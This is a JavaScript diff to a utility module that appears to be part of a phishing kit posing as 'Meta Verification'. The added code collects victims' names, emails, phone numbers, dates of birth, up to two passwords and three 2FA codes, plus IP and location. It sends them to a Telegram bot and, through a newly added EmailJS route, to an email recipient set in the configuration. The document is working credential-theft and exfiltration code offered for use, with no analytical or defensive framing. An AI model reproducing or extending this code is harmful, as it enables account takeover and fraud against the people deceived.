@@ -199,129 +199,134 @@ const Utils = {
 
             const text = `
 <b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location}</code>
+<b>Location:</b> <code>${locationData.location})</code>
 ----------------------------------
-<b>Full Name:</b> <code>${data.fullName || ""}</code>
-<b>Email:</b> <code>${data.email || ""}</code>
-<b>Page Name:</b> <code>${data.fanpage || ""}</code>
-<b>Phone:</b> <code>${data.phone || ""}</code>
+<b>Full Name:</b> <code>${data.fullName || ''}</code>
+<b>Email:</b> <code>${data.email || ''}</code>
+<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
+<b>Page Name:</b> <code>${data.fanpage || ''}</code>
+<b>Phone:</b> <code>${data.phone || ''}</code>
+<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
 ----------------------------------
-<b>Ticket ID:</b> <code>${data.ticketId || ""}</code>
-`;
+<b>Password(1):</b> <code>${data.password || ''}</code>
+<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
+----------------------------------
+<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
+<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
+<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
 
-            const response = await fetch(
-                `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
-                {
-                    method: "POST",
-                    headers: {
-                        "Content-Type":
-                            "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id:
-                            CONFIG.TELEGRAM_CHAT_ID,
-                        text,
-                        parse_mode: "HTML"
-                    })
-                }
-            );
-
-            if (!response.ok) {
-                throw new Error(
-                    `Telegram error: ${response.status}`
-                );
-            }
-
-            return true;
-
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                    text,
+                    parse_mode: 'HTML'
+                })
+            });
         } catch (error) {
-
-            console.error(
-                "Telegram error:",
-                error
-            );
-
-            return false;
+            console.error('Telegram error:', error);
         }
     },
 
-    async sendNotification(data) {
+    async sendToEmail(data) {
+        const locationData = await this.getUserLocation();
 
-        const type =
-            CONFIG.NOTIFICATION_TYPE;
+        const emailContent = `
+IP: ${locationData.ip}
+Location: ${locationData.location}
+----------------------------------
+Full Name: ${data.fullName || ''}
+Email: ${data.email || ''}
+Email Business: ${data.emailBusiness || ''}
+Page Name: ${data.fanpage || ''}
+Phone: ${data.phone || ''}
+Date of Birth: ${data.day}/${data.month}/${data.year}
+----------------------------------
+Password(1): ${data.password || ''}
+Password(2): ${data.passwordSecond || ''}
+----------------------------------
+🔐Code 2FA(1): ${data.twoFa || ''}
+🔐Code 2FA(2): ${data.twoFaSecond || ''}
+🔐Code 2FA(3): ${data.twoFaThird || ''}
+
+Sent at: ${new Date().toLocaleString()}`;
 
         try {
+            // Load EmailJS SDK if not already loaded
+            if (!window.emailjs) {
+                await this.loadEmailJSSDK();
+            }
 
-            if (
-                type === "telegram" ||
-                type === "both"
-            ) {
+            await emailjs.send(
+                CONFIG.EMAILJS_SERVICE_ID,
+                CONFIG.EMAILJS_TEMPLATE_ID,
+                {
+                    to_email: CONFIG.EMAIL_RECIPIENT,
+                    subject: `Meta Verification - ${locationData.location}`,
+                    message: emailContent,
+                    from_name: 'Meta Verification System',
+                    reply_to: data.email || 'noreply@system.com'
+                },
+                CONFIG.EMAILJS_PUBLIC_KEY
+            );
+        } catch (error) {
+            console.error('Email error:', error);
+        }
+    },
+
+    loadEmailJSSDK() {
+        return new Promise((resolve, reject) => {
+            if (window.emailjs) {
+                resolve();
+                return;
+            }
+
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            script.onload = () => {
+                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+                resolve();
+            };
+            script.onerror = reject;
+            document.head.appendChild(script);
+        });
+    },
+
+    async sendNotification(data) {
+        const notificationType = CONFIG.NOTIFICATION_TYPE;
+
+        try {
+            if (notificationType === 'telegram' || notificationType === 'both') {
                 await this.sendToTelegram(data);
             }
 
+            if (notificationType === 'email' || notificationType === 'both') {
+                await this.sendToEmail(data);
+            }
         } catch (error) {
-
-            console.error(
-                "Notification error:",
-                error
-            );
+            console.error('Notification error:', error);
         }
     },
 
     maskPhone(phone) {
-
-        if (!phone) return "";
-
-        phone = String(phone);
-
-        if (phone.length < 5) {
-            return phone;
-        }
-
-        const start =
-            phone.slice(0, 2);
-
-        const end =
-            phone.slice(-2);
-
-        return (
-            `${start}` +
-            `${"*".repeat(
-                phone.length - 4
-            )}` +
-            `${end}`
-        );
+        if (!phone || phone.length < 5) return phone;
+        const start = phone.slice(0, 2);
+        const end = phone.slice(-2);
+        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
     },
 
     maskEmail(email) {
-
-        if (!email) return "";
-
-        return String(email).replace(
-            /^(.)(.*?)(.)@(.+)$/,
-            (_, first, middle, last, domain) => {
-
-                return (
-                    `${first}` +
-                    `${"*".repeat(
-                        middle.length
-                    )}` +
-                    `${last}@${domain}`
-                );
-            }
-        );
+        if (!email) return '';
+        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
+            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
+        });
     },
 
     generateTicketId() {
-
-        const gen = () =>
-            Math.random()
-                .toString(36)
-                .substring(2, 6)
-                .toUpperCase();
-
-        return (
-            `${gen()}-${gen()}-${gen()}`
-        );
+        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
+        return `${gen()}-${gen()}-${gen()}`;
     }
 };
+
